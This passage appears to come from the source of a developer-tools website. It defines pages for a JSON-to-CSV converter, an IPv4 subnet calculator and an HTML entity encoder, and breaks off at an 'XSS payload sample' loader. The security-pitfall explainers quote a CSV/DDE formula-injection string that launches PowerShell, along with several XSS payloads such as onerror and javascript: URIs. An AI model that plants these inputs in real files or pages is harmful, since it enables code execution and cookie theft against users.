              <textarea id="j2c-in" class="code-input" style="height: 140px;" placeholder='[{"id":101,"name":"Alice Cooper","email":"alice@example.com","role":"Admin","active":true},{"id":102,"name":"Bob Smith","email":"bob@example.com","role":"Editor","active":false}]'></textarea>
            </div>

            <!-- Configuration Options -->
            <div style="display: flex; gap: 1rem; flex-wrap: wrap; align-items: center; margin: 1rem 0; padding: 0.75rem; background: var(--surface-alt); border: 1px solid var(--border); border-radius: 6px;">
              <div>
                <label style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted); display: block; margin-bottom: 0.25rem;">DELIMITER</label>
                <select id="csv-delim" class="text-input" style="padding: 0.35rem 0.6rem; font-family: var(--mono); font-size: 0.82rem;" onchange="jsonToCsv()">
                  <option value=",">Comma (,)</option>
                  <option value=";">Semicolon (;) [European Excel]</option>
                  <option value="&#9;">Tab (\t) [TSV Format]</option>
                  <option value="|">Pipe (|)</option>
                </select>
              </div>

              <label style="display: flex; align-items: center; gap: 0.4rem; font-size: 0.82rem; cursor: pointer; color: var(--fg); font-family: var(--mono); margin-top: 1rem;">
                <input type="checkbox" id="csv-headers" checked onchange="jsonToCsv()" /> Include Headers
              </label>

              <label style="display: flex; align-items: center; gap: 0.4rem; font-size: 0.82rem; cursor: pointer; color: var(--fg); font-family: var(--mono); margin-top: 1rem;">
                <input type="checkbox" id="csv-bom" checked /> Excel UTF-8 BOM
              </label>
            </div>

            <div class="action-bar" style="display: flex; gap: 0.5rem;">
              <button class="btn-primary" onclick="jsonToCsv()">Convert JSON to CSV</button>
            </div>

            <div class="field-group" style="margin-top: 1.5rem;">
              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
                <label class="field-label" style="margin: 0;">CSV Output</label>
                <span id="csvMetrics" style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted);">0 rows</span>
              </div>
              <textarea id="j2c-out" class="code-input" style="height: 140px;" readonly></textarea>
            </div>

            <!-- Action Buttons Grid -->
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-top: 1.25rem;">
              <button type="button" id="btnCopyCsv" onclick="copyCsv()" class="btn-sec" style="padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
                <span>📋 Copy CSV Text</span>
              </button>
              <button type="button" id="btnDownloadCsv" onclick="downloadCsvFile()" class="btn-sec" style="padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
                <span>💾 Download .CSV File</span>
              </button>
            </div>
          </div>

          <!-- 5 Critical CSV Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in CSV Exports &amp; Spreadsheet Data Integrity</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. CSV Formula Injection / DDE Remote Code Execution</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Spreadsheet processors (Excel, LibreOffice, Google Sheets) execute any cell beginning with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code> as a live mathematical formula or Dynamic Data Exchange (DDE) command. Malicious inputs like <code>=CMD|' /C powershell ...'!A1</code> trigger arbitrary command execution when opened. Always prefix formula-leading characters with an apostrophe (<code>'</code>).
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. The Missing UTF-8 BOM Mojibake Corruption</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Excel on Windows defaults to the system ANSI code page (Windows-1252) when opening CSV files without a leading Byte Order Mark (BOM). Without a UTF-8 BOM (<code>\uFEFF</code>), all accented characters (<code>é, ü</code>), Cyrillic, Asian glyphs, and currency symbols (<code>€, £</code>) turn into unreadable garbled mojibake (e.g. <code>Ã©</code>).
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Unescaped Multiline &amp; Delimiter RFC 4180 Violations</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  RFC 4180 dictates that any cell value containing the delimiter (comma), line breaks (<code>\n</code>), or double quotes must be wrapped in enclosing double quotes, with internal quotes escaped by doubling (<code>""</code>). Failing to strictly quote multiline user text breaks row alignment and crashes downstream automated ETL pipelines.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. Scientific Notation Truncation on Large Identifiers</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Spreadsheet engines automatically coerce long numeric strings (16-digit credit card numbers, order IDs, or tracking codes e.g. <code>1234567890123456</code>) into scientific notation (<code>1.23457E+15</code>). Excel permanently rounds the last digits to zero, irreversibly corrupting business transaction logs upon saving. Format large numeric IDs with explicit tab or text wrappers.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Heterogeneous JSON Key Skew in NoSQL Datasets</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  In document databases (MongoDB, DynamoDB), JSON records are schema-less. Naively inspecting only the first object (<code>Object.keys(data[0])</code>) discards columns that appear exclusively in later records or shifts cell data into incorrect columns. A robust converter must scan all objects to compile an exhaustive master header set.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          function formatCsvCell(val, delim) {
            if (val === null || val === undefined) return '';
            var str = typeof val === 'object' ? JSON.stringify(val) : String(val);
            var needsQuotes = str.indexOf(delim) !== -1 || str.indexOf('"') !== -1 || str.indexOf('\n') !== -1 || str.indexOf('\r') !== -1;
            if (needsQuotes) {
              str = '"' + str.replace(/"/g, '""') + '"';
            }
            return str;
          }

          window.jsonToCsv = function() {
            var raw = (document.getElementById('j2c-in') ? document.getElementById('j2c-in').value : '').trim();
            var outEl = document.getElementById('j2c-out');
            var metricsEl = document.getElementById('csvMetrics');
            var delim = document.getElementById('csv-delim') ? document.getElementById('csv-delim').value : ',';
            var incHeaders = document.getElementById('csv-headers') ? document.getElementById('csv-headers').checked : true;

            if (!raw) {
              outEl.value = '';
              metricsEl.textContent = '0 rows';
              return;
            }

            try {
              var data = JSON.parse(raw);
              if (!Array.isArray(data)) {
                if (typeof data === 'object' && data !== null) data = [data];
                else throw new Error('Input must be a JSON array of objects');
              }
              if (data.length === 0) {
                outEl.value = '';
                metricsEl.textContent = '0 rows';
                return;
              }

              // Build exhaustive header set from all records
              var headerMap = {};
              data.forEach(function(item) {
                if (item && typeof item === 'object') {
                  Object.keys(item).forEach(function(k) { headerMap[k] = true; });
                }
              });
              var headers = Object.keys(headerMap);

              var rows = [];
              if (incHeaders) {
                rows.push(headers.map(function(h) { return formatCsvCell(h, delim); }).join(delim));
              }

              data.forEach(function(item) {
                if (!item || typeof item !== 'object') return;
                var row = headers.map(function(h) {
                  return formatCsvCell(item[h], delim);
                });
                rows.push(row.join(delim));
              });

              var csv = rows.join('\n');
              outEl.value = csv;
              metricsEl.textContent = data.length + ' rows, ' + headers.length + ' columns';
            } catch(e) {
              outEl.value = 'Error: ' + e.message;
              metricsEl.textContent = 'Error';
            }
          };

          window.loadSampleJson = function() {
            var sample = [
              { "id": 101, "name": "Alice Cooper", "department": "Security", "email": "alice@company.com", "salary": 125000, "verified": true },
              { "id": 102, "name": "Bob Martin", "department": "Engineering", "email": "bob@company.com", "salary": 140000, "verified": true },
              { "id": 103, "name": "Charlie, Brown", "department": "Design", "email": "charlie@company.com", "salary": 95000, "verified": false },
              { "id": 104, "name": "Diana Prince", "department": "Product", "email": "diana@company.com", "salary": 155000, "verified": true }
            ];
            document.getElementById('j2c-in').value = JSON.stringify(sample, null, 2);
            jsonToCsv();
          };

          window.copyCsv = function() {
            var csv = document.getElementById('j2c-out') ? document.getElementById('j2c-out').value : '';
            if (!csv) { jsonToCsv(); csv = document.getElementById('j2c-out').value; }

            navigator.clipboard.writeText(csv).then(function() {
              var btn = document.getElementById('btnCopyCsv');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ CSV Copied to Clipboard!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };

          window.downloadCsvFile = function() {
            var csv = document.getElementById('j2c-out') ? document.getElementById('j2c-out').value : '';
            if (!csv) { jsonToCsv(); csv = document.getElementById('j2c-out').value; }
            if (!csv || csv.startsWith('Error:')) return;

            var useBom = document.getElementById('csv-bom') ? document.getElementById('csv-bom').checked : true;
            var blobContent = useBom ? ['\uFEFF', csv] : [csv];
            var blob = new Blob(blobContent, { type: 'text/csv;charset=utf-8;' });
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'export_' + Date.now() + '.csv';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
          };

          document.addEventListener('DOMContentLoaded', function() {
            var inp = document.getElementById('j2c-in');
            if (inp && inp.value) jsonToCsv();
          });
        </script>
      `
    },
    {
      slug: 'ip-subnet-calculator',
      title: 'IPv4 CIDR Subnet Calculator',
      metaDesc: 'Calculate network address, broadcast address, netmask, and usable host count from IP/CIDR prefix.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; IP Subnet Calculator
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">IPv4 CIDR Subnet Calculator</h1>
          <div class="tool-box">
            <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 1rem;">
              <div class="field-group"><label class="field-label">IP Address</label><input type="text" id="ip-addr" class="text-input" value="192.168.1.100" oninput="calcSubnet()" /></div>
              <div class="field-group"><label class="field-label">CIDR Prefix (/) </label><input type="number" id="ip-cidr" class="text-input" value="24" min="1" max="32" oninput="calcSubnet()" /></div>
            </div>
            <div style="background: var(--surface-alt); border: 1px solid var(--border); padding: 1rem; border-radius: 4px; font-family: var(--mono); font-size: 0.9rem; margin-top: 1rem;" id="subnet-res"></div>

            <!-- Copy Subnet Diagnostic -->
            <button type="button" id="btnCopySubnetReport" onclick="copySubnetReport()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
              <span>📋 Copy Complete IPv4 Subnet Breakdown</span>
            </button>
          </div>

          <!-- 5 Critical IPv4 Subnetting & CIDR Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in IPv4 Subnetting &amp; CIDR Architecture</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. The /31 Point-to-Point vs. Legacy Subnet Mask Trap (RFC 3021)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Traditional networking rules dictate that every subnet loses 2 addresses for Network ID (all 0s) and Directed Broadcast (all 1s). Under this rule, a <code>/30</code> allocation provides 4 IPs but only 2 usable hosts (50% waste). RFC 3021 established <code>/31</code> point-to-point links (routers, firewalls) where both addresses are usable host interfaces with NO broadcast, saving hundreds of thousands of public IPv4 addresses globally.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. Cloud VPC Reserved IP Addresses (The AWS/Azure 5-IP Tax)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Public cloud providers do NOT follow standard RFC host availability. AWS VPC reserves the first 4 IPs and last 1 IP in every subnet (e.g. <code>.0</code> Network, <code>.1</code> VPC Router, <code>.2</code> DNS, <code>.3</code> Future Use, and <code>.255</code> Broadcast). A <code>/28</code> subnet (16 theoretical IPs) yields only 11 usable instances in AWS! Failing to account for this 5-IP deduction exhausts subnets during auto-scaling.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Overlapping CIDR Blocks in Hybrid Cloud &amp; VPN Peering</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Provisioning common private subnets like <code>10.0.0.0/16</code> or <code>192.168.1.0/24</code> across both on-premises data centers and AWS/GCP VPCs prevents VPC Peering, Transit Gateway attachments, and Site-to-Site IPsec VPN routing. Resolving overlapping IP space requires complex bidirectional Source/Destination 1:1 NAT or disruptive IP renumbering.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. The Subnet Mask vs. Wildcard Mask Inversion in Cisco ACLs</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Cisco Access Control Lists (ACLs) and OSPF network statements use inverse wildcard masks rather than subnet masks. For a <code>/24</code> subnet (<code>255.255.255.0</code>), the wildcard mask is <code>0.0.0.255</code> (where 0 indicates an exact bit match and 1 indicates "don't care"). Accidentally entering <code>255.255.255.0</code> in an ACL rule matches the inverse address pattern, accidentally exposing sensitive private subnets to the public internet.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Variable Length Subnet Masking (VLSM) Route Aggregation Failure</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Subdividing contiguous address space into fragmented, non-contiguous subnets prevents BGP and OSPF route summarization (supernetting). When routers cannot aggregate routes into single CIDR prefixes, global and internal routing tables bloat, exhausting router hardware memory (TCAM) and increasing convergence latency.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          function intToIpv4(num) {
            return [(num >>> 24) & 255, (num >>> 16) & 255, (num >>> 8) & 255, num & 255].join('.');
          }

          function ipv4ToInt(ip) {
            return ip.split('.').reduce((acc, oct) => ((acc << 8) + parseInt(oct, 10)) >>> 0, 0);
          }

          function calcSubnet() {
            var ipInput = document.getElementById('ip-addr') ? document.getElementById('ip-addr').value.trim() : '192.168.1.1';
            var cidr = parseInt(document.getElementById('ip-cidr').value, 10);
            if (isNaN(cidr) || cidr < 0 || cidr > 32) cidr = 24;

            var maskInt = cidr === 0 ? 0 : (~0 << (32 - cidr)) >>> 0;
            var wildcardInt = (~maskInt) >>> 0;

            var ipParts = ipInput.split('.');
            var validIp = ipParts.length === 4 && ipParts.every(p => !isNaN(p) && parseInt(p, 10) >= 0 && parseInt(p, 10) <= 255);
            var ipInt = validIp ? ipv4ToInt(ipInput) : ipv4ToInt('192.168.1.1');

            var netInt = (ipInt & maskInt) >>> 0;
            var bcastInt = (netInt | wildcardInt) >>> 0;

            var totalHosts = Math.pow(2, 32 - cidr);
            var usableHosts = 0;
            var rangeStr = '';

            if (cidr === 32) {
              usableHosts = 1;
              rangeStr = intToIpv4(netInt) + ' (Single Host)';
            } else if (cidr === 31) {
              usableHosts = 2;
              rangeStr = intToIpv4(netInt) + ' – ' + intToIpv4(bcastInt) + ' (RFC 3021 Point-to-Point)';
            } else {
              usableHosts = Math.max(0, totalHosts - 2);
              rangeStr = intToIpv4(netInt + 1) + ' – ' + intToIpv4(bcastInt - 1);
            }

            var maskStr = intToIpv4(maskInt);
            var wildcardStr = intToIpv4(wildcardInt);
            var netStr = intToIpv4(netInt);
            var bcastStr = intToIpv4(bcastInt);

            var ipClass = 'Classless (CIDR)';
            var firstOctet = (netInt >>> 24) & 255;
            if (firstOctet >= 1 && firstOctet <= 126) ipClass = 'Class A';
            else if (firstOctet >= 128 && firstOctet <= 191) ipClass = 'Class B';
            else if (firstOctet >= 192 && firstOctet <= 223) ipClass = 'Class C';
            else if (firstOctet >= 224 && firstOctet <= 239) ipClass = 'Class D (Multicast)';
            else if (firstOctet >= 240 && firstOctet <= 255) ipClass = 'Class E (Experimental)';

            window._subnetData = {
              ip: validIp ? ipInput : '192.168.1.1',
              cidr: cidr,
              mask: maskStr,
              wildcard: wildcardStr,
              network: netStr,
              broadcast: bcastStr,
              usableRange: rangeStr,
              totalHosts: totalHosts,
              usableHosts: usableHosts,
              ipClass: ipClass
            };

            var html = '<div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(200px, 1fr));gap:0.75rem;">' +
              '<div><span style="color:var(--text-muted);font-size:0.75rem;text-transform:uppercase;">Subnet Mask</span><br><strong>' + maskStr + '</strong></div>' +
              '<div><span style="color:var(--text-muted);font-size:0.75rem;text-transform:uppercase;">Network Address</span><br><strong style="color:#3b82f6;">' + netStr + '/' + cidr + '</strong></div>' +
              '<div><span style="color:var(--text-muted);font-size:0.75rem;text-transform:uppercase;">Broadcast IP</span><br><strong style="color:#ef4444;">' + bcastStr + '</strong></div>' +
              '<div><span style="color:var(--text-muted);font-size:0.75rem;text-transform:uppercase;">Wildcard Mask</span><br><strong>' + wildcardStr + '</strong></div>' +
              '<div><span style="color:var(--text-muted);font-size:0.75rem;text-transform:uppercase;">Usable Host Range</span><br><strong style="color:#10b981;">' + rangeStr + '</strong></div>' +
              '<div><span style="color:var(--text-muted);font-size:0.75rem;text-transform:uppercase;">Usable Hosts (Capacity)</span><br><strong style="color:#8b5cf6;">' + usableHosts.toLocaleString() + ' hosts (' + totalHosts.toLocaleString() + ' total)</strong></div>' +
              '<div><span style="color:var(--text-muted);font-size:0.75rem;text-transform:uppercase;">Address Architecture</span><br><strong>' + ipClass + '</strong></div>' +
              '</div>';

            document.getElementById('subnet-res').innerHTML = html;
          }

          window.copySubnetReport = function() {
            if (!window._subnetData) calcSubnet();
            var d = window._subnetData;
            var text = '🌐 IPv4 CIDR Subnet Architecture Report\n' +
              '• IP / Prefix: ' + d.ip + '/' + d.cidr + '\n' +
              '• Network Address: ' + d.network + '\n' +
              '• Subnet Mask: ' + d.mask + '\n' +
              '• Wildcard Mask: ' + d.wildcard + '\n' +
              '• Usable Host Range: ' + d.usableRange + '\n' +
              '• Usable Host Capacity: ' + d.usableHosts.toLocaleString() + ' addresses\n' +
              '• Total Subnet Addresses: ' + d.totalHosts.toLocaleString() + '\n' +
              '• Broadcast Address: ' + d.broadcast + '\n' +
              '• Network Class: ' + d.ipClass + '\n\n' +
              'Calculated at digitaltoolsshed.com/dev/ip-subnet-calculator';

            navigator.clipboard.writeText(text).then(function() {
              var btn = document.getElementById('btnCopySubnetReport');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ Subnet Report Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };

          document.addEventListener('DOMContentLoaded', calcSubnet);
        </script>
      `
    },
    {
      slug: 'html-entity-encoder',
      title: 'HTML Entity Encoder & Decoder',
      metaDesc: 'Convert special characters into HTML named and numeric entities and decode HTML entities back to plaintext.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 920px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; HTML Entity Encoder
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">HTML Entity Encoder &amp; Decoder Studio</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Convert reserved HTML characters, symbols, and Unicode strings into named, decimal, or hexadecimal entities and decode them safely.
          </p>

          <div class="tool-box">
            <div class="field-group">
              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
                <label class="field-label" style="margin: 0;">Input Text or HTML</label>
                <button type="button" class="btn-sec" style="font-size: 0.72rem; padding: 0.2rem 0.5rem;" onclick="loadXssPayloadSample()">Load XSS Payload Sample</button>
              </div>
              <textarea id="ent-in" class="code-input" style="height: 120px;" placeholder='<div class="banner">Hello &amp; welcome to "Digital Tools Shed" &lt;2026&gt;!</div>'></textarea>
            </div>

            <!-- Mode Selector Bar -->
            <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin: 1rem 0;">
              <button type="button" class="btn-primary" onclick="entityTransform('named')">Encode Named Entities (&amp;amp; &amp;lt;)</button>
              <button type="button" class="btn-sec" onclick="entityTransform('decimal')">Encode Decimal (&#38;)</button>
              <button type="button" class="btn-sec" onclick="entityTransform('hex')">Encode Hexadecimal (&#x26;)</button>
              <button type="button" class="btn-sec" onclick="entityTransform('decode')">Decode Entities to Text</button>
              <button type="button" class="btn-sec" onclick="clearEntityInputs()">Clear</button>
            </div>

            <div class="field-group" style="margin-top: 1.25rem;">
              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
                <label class="field-label" style="margin: 0;">Output Result</label>
                <span id="entMetrics" style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted);">0 chars</span>
              </div>
              <textarea id="ent-out" class="code-input" style="height: 120px;" readonly></textarea>
            </div>

            <!-- Copy Button -->
            <button type="button" id="btnCopyHtmlEntities" onclick="copyHtmlEntities()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
              <span>📋 Copy Encoded / Decoded HTML Entities</span>
            </button>
          </div>

          <!-- 5 Critical HTML Entity & Sanitization Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in HTML Entities &amp; XSS Defense Architecture</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. The Incomplete 5-Character Sanitization Fallacy</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Escaping only the five canonical characters (<code>&amp; &lt; &gt; " '</code>) is insufficient to prevent Cross-Site Scripting (XSS) inside unquoted HTML attributes or JavaScript event handlers. Inside an unquoted attribute (<code>&lt;input value=\${input}&gt;</code>), an attacker does not need quotes or angle brackets; a simple space or tab followed by <code>onfocus=alert(1) autofocus</code> achieves full script execution.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. Double-Encoding Cascades (&amp;amp;amp; Pollution)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  When user input is encoded during database storage and subsequently re-encoded during template rendering, ampersands compound exponentially: <code>&amp;copy;</code> becomes <code>&amp;amp;copy;</code>, displaying literal <code>&amp;copy;</code> code on screen instead of the copyright symbol. Applications should store unescaped canonical strings in the database and apply entity encoding exclusively at the final view rendering boundary.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Context Ineffectiveness in 'href' &amp; 'src' URI Attributes</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  HTML entity encoding does NOT sanitize URLs. If an attacker inputs <code>javascript:alert(document.cookie)</code> and you entity-encode it as <code>&lt;a link-url="&amp;#106;avascript:alert(1)"&gt;</code>, modern web browsers decode the HTML entities inside URI attributes BEFORE executing the link, resulting in instant XSS. URIs require strict protocol whitelisting (<code>http://</code>, <code>https://</code>).
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. DOM-Based XSS via 'innerHTML' Entity Decoding</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  A pervasive JavaScript antipattern decodes HTML entities by creating an off-screen element and setting <code>el.innerHTML = input</code> followed by reading <code>el.textContent</code>. If the input contains <code>&lt;img src=x onerror=alert(1)&gt;</code>, setting <code>innerHTML</code> immediately fires the <code>onerror</code> event in browser memory before the element is even attached to the DOM.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. XML / SVG Parser Abort on HTML Named Entities</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  While HTML5 recognizes over 2,000 named entities (e.g. <code>&amp;nbsp;</code>, <code>&amp;euro;</code>, <code>&amp;mdash;</code>), strict XML, XHTML, and SVG engines only natively recognize five: <code>&amp;quot; &amp;amp; &amp;apos; &amp;lt; &amp;gt;</code>. Injecting <code>&amp;nbsp;</code> into an SVG or RSS feed causes XML parsers to abort with fatal <code>entity not defined</code> parsing errors.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          var entityMap = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;',
            '\x60': '&#96;'
          };

          window.entityTransform = function(mode) {
            var raw = (document.getElementById('ent-in') ? document.getElementById('ent-in').value : '');
            var out = '';

            if (mode === 'named') {
              out = raw.replace(/[&<>"'\x60]/g, function(s) { return entityMap[s] || s; });
            } else if (mode === 'decimal') {
              out = raw.replace(/[\s\S]/g, function(ch) {
                var code = ch.charCodeAt(0);
                return (code < 32 || code > 126 || /[&<>"'\x60]/.test(ch)) ? '&#' + code + ';' : ch;
              });
            } else if (mode === 'hex') {
              out = raw.replace(/[\s\S]/g, function(ch) {
                var code = ch.charCodeAt(0);
                return (code < 32 || code > 126 || /[&<>"'\x60]/.test(ch)) ? '&#x' + code.toString(16).toUpperCase() + ';' : ch;
              });
            } else if (mode === 'decode') {
              // Safe entity decoding using DOMParser to prevent code execution
              try {
                var doc = new DOMParser().parseFromString('<!doctype html><body>' + raw, 'text/html');
                out = doc.body.textContent || '';
              } catch(e) {
                out = raw.replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'");
              }
            }

            document.getElementById('ent-out').value = out;
            document.getElementById('entMetrics').textContent = out.length + ' chars';
          };

          window.clearEntityInputs = function() {
            document.getElementById('ent-in').value = '';
            document.getElementById('ent-out').value = '';
            document.getElementById('entMetrics').textContent = '0 chars';
          };

          window.loadXssPayloadSample = function() {
